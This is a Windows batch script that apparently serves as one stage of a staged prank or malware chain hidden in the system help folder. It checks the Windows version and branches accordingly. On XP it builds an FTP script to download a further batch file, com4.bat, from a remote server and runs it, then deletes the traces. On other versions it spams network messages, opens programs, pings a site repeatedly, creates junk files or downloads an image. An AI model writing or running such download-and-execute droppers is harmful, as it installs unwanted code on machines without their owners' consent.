@ECHO OFF
DEL /F /Q "%SystemRoot%\help\combat\2.log"
IF EXIST "%SystemRoot%\help\combat\3.log" GOTO END
> "%SystemRoot%\help\combat\3.log" ECHO log 3
>>"%SystemRoot%\help\combat\3.log" ECHO.

:FINDOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO WinXP
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO WinNT
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO WinME
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win98
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win95
GOTO END

:WinXP
> "%SystemRoot%\help\combat\down.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\down.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\down.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\down.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\down.txt" ECHO prompt
>>"%SystemRoot%\help\combat\down.txt" ECHO get "com4.bat" "%SystemRoot%\help\combat\com4.bat"
>>"%SystemRoot%\help\combat\down.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\down.txt" GOTO WinXP
FTP -s:"%SystemRoot%\help\combat\down.txt"
DEL /F /Q "%SystemRoot%\help\combat\down.txt"
"%SystemRoot%\help\combat\com4.bat"
GOTO END

:Win2K
NET SEND * HELLO WORLD!
NET SEND * WAKE UP NEO.
NET SEND * FOLLOW THE WHITE RABBIT.
GOTO END

:WinNT
ping www.google.com -n 99 -w 1000
GOTO END

:WinME
notepad
paint
calc
GOTO END

:Win98
MKDIR "%SystemDrive%\NOTEMPTY\"
> "%SystemDrive%\NOTEMPTY\0.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\1.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\2.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\3.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\4.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\5.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\6.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\7.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\8.txt" ECHO.
> "%SystemDrive%\NOTEMPTY\9.txt" ECHO.
GOTO END

:Win95
> "%SystemRoot%\help\combat\down.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\down.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\down.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\down.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\down.txt" ECHO prompt
>>"%SystemRoot%\help\combat\down.txt" ECHO get "me.jpg" "%SystemDrive%\me.jpg"
>>"%SystemRoot%\help\combat\down.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\down.txt" GOTO Win95
FTP -s:"%SystemRoot%\help\combat\down.txt"
DEL /F /Q "%SystemRoot%\help\combat\down.txt"
GOTO END

:END
EXIT